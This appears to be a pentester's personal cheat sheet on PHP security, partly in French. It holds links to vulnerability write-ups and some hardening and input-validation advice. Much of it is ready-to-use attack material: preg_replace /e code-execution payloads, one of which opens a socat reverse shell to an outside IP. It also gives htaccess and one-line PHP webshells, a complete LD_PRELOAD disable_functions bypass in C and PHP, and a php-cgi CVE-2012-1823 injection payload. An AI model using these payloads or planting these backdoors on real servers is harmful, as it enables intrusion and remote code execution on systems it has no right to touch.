# php

# badass past vulns
https://github.com/80vul/phpcodz

# simple php standalone web server
php -S localhost:8000 -t public_html/

# operator == (type confusion)
https://habnab.it/php-table.html
http://gynvael.coldwind.pl/?id=492
https://docs.google.com/spreadsheets/d/1oWsmTvEZcfgc_1QkBczNGA3Gcffg_pmgKcak7iZldUw/pub?output=html

# magic hashes
https://www.whitehatsec.com/blog/magic-hashes/

# different arrays compare identical due to integer key truncation
https://www.sektioneins.de/blog/15-08-03-php_challenge_2015_solution.html
http://3v4l.org/Sjdf8

# configuration audit hardening
https://www.sektioneins.de/en/blog/14-08-21-php-secure-configuration-checker.html

# determiner la version
form.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
form.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42

http://www.0php.com/php_easter_egg.php

# see what modules are enabled
php -m

# bypass write restrictions to webroot by overwrite cached index.php.bin
http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

# preg_replace
preg_replace($_POST["find"], $_POST["replace"], $_POST["text"]); exploit with:text=heydude&find=/dude/e&replace=`ls`

curl 'http://10.0.0.1/demo/preg_replace.php?ville=`socat+exec:sh+tcp:10.10.220.211:8888`/e%00'
curl 'http://10.0.0.1/demo/preg_replace.php?ville=print+2;%23/e%00'
curl 'http://10.0.0.1/demo/preg_replace.php?ville=%23(.*)|%0aeval($_GET\[3\]);%23/e%00&3=system(%22id%22);' 

# unserialize RCEs
http://vagosec.org/2013/09/wordpress-php-object-injection/
http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/

# unserialize / object injection 101
http://securitycafe.ro/2015/01/05/understanding-php-object-injection/
http://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing
https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/ (the guy who makes RIPS) and http://ebrietas0.blogspot.fr/2015/08/magento-bug-bounty-1-2-csrf-to-code.html

# lulz
PCRE_REPLACE_EVAL has been deprecated as of PHP 5.5.0
NULL byte poisoning was fixed as of PHP 5.3.4

# security best practice
http://thisinterestsme.com/php-best-practises/
http://stackoverflow.com/questions/3115559/exploitable-php-functions

# static analysis
http://rips-scanner.sourceforge.net/

# pour ne pas renvoyer le X-Powered-By: PHP/5.2.9 dans les entetes HTTP
expose_php = Off

# magic quotes gpc (formation HSC)
gpc=get post cookie

application systematique de la fonction addslashes sur les var GET POST COOKIE
magic_quotes_gpc ne fait rien d'autre que d'appeler addslashes (qui n'echape que ', ", NUL).
ph34r les caractères multi-octets 

meme activé, sqli reste possible si
- entier: WHERE id = $GET["id"]
- app err: WHERE url = '".urldecode($GET["url"])

C'est l'application qui doit valider les entrées. 
+ is_int + intval, is_float ...
+ whitelist (in_array, regex)
+ mysql_real_escape_string
+ sql prepared statements (client-side ou server-side): plus besoin d'appeler mysql_real_escape et cie

# (int) ou intval()
intval fait au mieux eg. 123abc => 123
vaut mieux faire is_int puis (int) sinon renvoyer 0

# configuration secure
display_errors = Off
error_reporting = E_ALL
log_error = On
#error_log
html_errors = Off
register_globals = Off
register_argc_argv
variables_order = "GPCS"
session.use_trans_sid = 0
session.use_only_cookies = 1
session.use_trans_sid = 0
session.cookie_lifetime = 7200
session.auto_start = 0
session.cache_limiter = nocache
session.cookie_httponly = 1
session.bug_compat_42 = 0

# filters
<?php include "data://text/plain;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pgo="; ?>

# backdoors / webshells
* htaccess
<Files ~ "^.ht.*$">
order deny,allow
allow from all
</Files>
AddType application/x-httpd-php .htaccess
AddHandler x-httpd-php .htaccess
php_flag engine on
#<?phpinfo();?>

* extract
@extract($_REQUEST);
@die($ctime($atime));
http://...?ctime=system&atime=id

* simple
<?php $_GET['a']($_GET['b']); ?>

# build httpd + php with support for mysql, oci and mssql
~/code/src/php-5-3.10 $ ./configure  --prefix=/opt/m/php/php-5.3.10 --with-apxs2=/opt/m/httpd/httpd-2.4.1/bin/apxs --with-oci8=shared,/u01/app/oracle/product/11.2.0/xe --with-mysql=mysqlnd --with-mssql=/home/seb/code/src/freetds-0.91/opt/

# php tricks
# http://www.php.net/manual/en/ini.list.php
# http://www.php.net/manual/en/configuration.changes.php
print_r(ini_get_all());
ini_set('display_errors', '1');

$args = array('-c', $_POST['c']);
print_r($args); // next line would return HTTP 500 without this line (?!)
pcntl_exec('/bin/bash', $args);

# disable_functions of plaidctf
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
http://www.reddit.com/r/netsec/comments/2tyh93/php_disable_functions_procfs_bypass_ru/

variant from 0ctf-2016 guestbook
compile with gcc -c -fPIC a.c -o a.o && gcc a.o -shared -o a.so
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int getuid ()
{
char * en;
char * buf = malloc (300);
FILE * a;
unsetenv( "LD_PRELOAD");
a = fopen( "/var/www/.comm", "r");
buf = fgets(buf, 100, a);
write(2, buf, strlen(buf));
fclose(a);
remove("/var/www/.comm");
rename("/var/www/a.so", "/var/www/b.so");
buf = strcat(buf, "> /var/www/.comm1");
system(buf);
rename( "/var/www/b.so", "/var/www/a.so");
free(buf);
return 0;
} 
upload ws.php:
<?php
putenv("LD_PRELOAD=/var/www/a.so");
$a = fopen("/var/www/.comm", "w");
fputs($a, $_GET["c"]);
fclose($a);
mail("a", "a", "a", "a");
$a = fopen("/var/www/.comm1", "r");
while (!feof($a))
{$b = fgets($a); echo $b;}
fclose($a);  ?> 

# php-cgi
http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
http://vuln.lol/path/?-s
curl -v 'http://vuln.lol/path/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system("sleep 30");die(); ?>'
http://vuln.lol/cgi-bin/php/...
